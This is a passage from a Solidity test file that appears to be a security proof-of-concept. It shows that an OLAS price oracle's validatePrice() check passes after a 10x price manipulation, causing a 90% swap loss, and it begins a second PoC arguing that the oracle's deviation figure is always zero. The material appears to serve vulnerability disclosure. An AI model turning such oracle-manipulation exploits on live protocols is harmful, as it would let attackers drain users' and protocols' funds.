le.validatePrice(MAX_SLIPPAGE);\n        console.log(\"         validatePrice() returns:\", isValid);\n\n        // Step 4: Since validatePrice() returns true, swap proceeds at manipulated price\n        console.log(\"Step 4 - Swap proceeds at 10x inflated price\");\n\n        // Step 5: Impact calculation\n        // If protocol wanted to buy 1 ETH worth of OLAS:\n        // - At fair price: would get 1000 OLAS\n        // - At manipulated price: gets only 100 OLAS\n        // - Loss: 900 OLAS (90% loss!)\n\n        uint256 expectedOLAS = 1e18 * initialPrice / 1e18;\n        uint256 actualOLAS = 1e18 * manipulatedPrice / 1e18;\n\n        console.log(\"\\n=== IMPACT ===\");\n        console.log(\"Expected OLAS for 1 ETH:\", expectedOLAS / 1e18);\n        console.log(\"Actual OLAS received:\", actualOLAS / 1e18);\n        console.log(\"Protocol loss:\", (expectedOLAS - actualOLAS) * 100 / expectedOLAS, \"%\");\n\n        // Verify the attack succeeded\n        assertTrue(isValid, \"Attack succeeded: validatePrice() bypassed\");\n        assertGt(manipulatedPrice, initialPrice * 5, \"Price was manipulated more than 5x\");\n    }\n\n    /**\n     * @notice PoC 4: Mathematical proof that derivation is always 0\n     */\n    function test_Derivation_Always_Zero() public {\n        pair.advanceTime(100);\n        vm.warp(block.timestamp + 1);\n\n        // Get values that oracle uses internally\n        uint256 tradePrice = oracle.getPrice();\n\n        // Simulate internal calculation:\n        // cumulativePriceLast = pair.price1CumulativeLast() (direction dependent)\n        // elapsedTime = block.timestamp - blockTimestampLast\n        // cumulativePrice = cumulativePriceLast + (tradePrice * elapsedTime)\n        // timeWeightedAverage = (cumulativePrice - cumulativePriceLast) / elapsedTime\n        //                     = tradePrice\n\n        uint256 timeWeightedAverage = tradePrice; // As proven above\n\n        // Derivation calculation from oracle:\n        uint